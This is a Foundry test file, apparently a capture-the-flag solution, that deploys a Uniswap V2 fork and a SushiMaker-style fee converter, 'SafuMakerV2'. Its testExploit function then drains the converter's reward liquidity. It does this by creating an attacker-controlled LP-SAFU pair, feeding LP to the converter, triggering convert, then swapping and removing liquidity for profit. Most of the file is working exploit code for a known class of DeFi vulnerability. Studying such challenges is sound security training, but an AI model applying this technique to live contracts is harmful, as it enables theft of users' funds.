// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Utilities} from "../Utilities.sol";
import {Token} from "../../src/Token.sol";
import {WETH9} from "../../src/WETH9.sol";
import {ISafuFactory, ISafuPair, SafuMakerV2} from "../../src/free-lunch/SafuMakerV2.sol";

interface ISafuRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract SafuMakerV2Test is Test {
  Utilities private utils;
  address payable private attacker;

  // Base trading pair token
  Token private usdc;
  // Farm token
  Token private safu;
  // Native token
  WETH9 private weth;
  // SushiBar contract address, irrelevant for exploit
  address constant BAR_ADDRESS = 0x1111111111111111111111111111111111111111;

  SafuMakerV2 private safuMaker;
  ISafuFactory private safuFactory;
  ISafuRouter private safuRouter;
  // Starts with just one trading pool: USDC-SAFU
  ISafuPair private safuPair;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(1);
    attacker = users[0];
    vm.label(attacker, "Attacker");

    usdc = new Token("USDC", "USDC");
    vm.label(address(usdc), "USDC");
    usdc.mint(address(this), 1_000_000e18);
    usdc.mint(attacker, 100e18);

    safu = new Token("SAFU", "SAFU");
    safu.mint(address(this), 1_000_000e18);
    safu.mint(attacker, 100e18);

    weth = new WETH9();

    safuFactory = ISafuFactory(
        deployCode(
            "./build-uniswap/v2/UniswapV2Factory.json",
            abi.encode(address(this)) // feeToSetter
        )
    );
    safuRouter = ISafuRouter(
        deployCode(
            "./build-uniswap/v2/UniswapV2Router02.json",
            abi.encode(address(safuFactory), address(weth))
        )
    );

    safuMaker = new SafuMakerV2(address(safuFactory), BAR_ADDRESS, address(safu), address(usdc));
    safuFactory.setFeeTo(address(safuMaker));

    usdc.approve(address(safuRouter), type(uint256).max);
    safu.approve(address(safuRouter), type(uint256).max);

    // Create USDC-SAFU pair
    safuRouter.addLiquidity(
      address(usdc),
      address(safu),
      1_000_000e18,
      1_000_000e18,
      0,
      0,
      address(this),
      block.timestamp
    );

    // Get USDC-SAFU pair
    safuPair = ISafuPair(safuFactory.getPair(address(usdc), address(safu)));

    // Simulates trading activity, as LP is issued to feeTo address for trading rewards
    IERC20(address(safuPair)).transfer(address(safuMaker), 10_000e18); // 1% of LP
  }

  function testExploit() public {
    // Exploit start
    vm.startPrank(attacker, attacker);

    // Setting approval of base tokens
    usdc.approve(address(safuRouter), type(uint256).max);
    safu.approve(address(safuRouter), type(uint256).max);

    // Getting LP tokens for SAFU-USDC pool
    safuRouter.addLiquidity(
      address(usdc),
      address(safu),
      10e18,
      10e18,
      0,
      0,
      attacker,
      block.timestamp
    );

    // Approving LP tokens for use
    IERC20(address(safuPair)).approve(address(safuRouter), type(uint256).max);

    // Creating a new pair of LP-SAFU
    safuRouter.addLiquidity(
      address(safuPair),
      address(safu),
      10e18,
      100,
      0,
      0,
      attacker,
      block.timestamp
    );

    ISafuPair attackerPair = ISafuPair(safuFactory.getPair(address(safuPair), address(safu)));

    // Sending some LP of new pair to safuMaker & converting reward funds to SAFU
    uint256 attackerLP = attackerPair.balanceOf(attacker);

    // Transfer 10% of LP
    IERC20(address(attackerPair)).transfer(address(safuMaker), attackerLP / 10);

    safuMaker.convert(address(safu), address(safuPair));

    address[] memory path = new address[](2);
    path[0] = address(safu);
    path[1] = address(safuPair);

    // Swapping into attack LP pool to get most of the safuPair LP tokens
    // Remove liquidity is better than swap, done for laziness bc underflow
    safuRouter.swapTokensForExactTokens(
      5000e18,
      1000,
      path,
      attacker,
      block.timestamp
    );

    // Removing liquidity for the safuPair LP - receive USDC & SAFU
    safuRouter.removeLiquidity(
      address(usdc),
      address(safu),
      safuPair.balanceOf(attacker),
      0,
      0,
      attacker,
      block.timestamp
    );

    vm.stopPrank();
    // Exploit end

    validate();
  }

  function validate() private {
    // x50
    assertGt(usdc.balanceOf(attacker), 5_000e18);
    assertGt(safu.balanceOf(attacker), 1_000e18);
  }
}
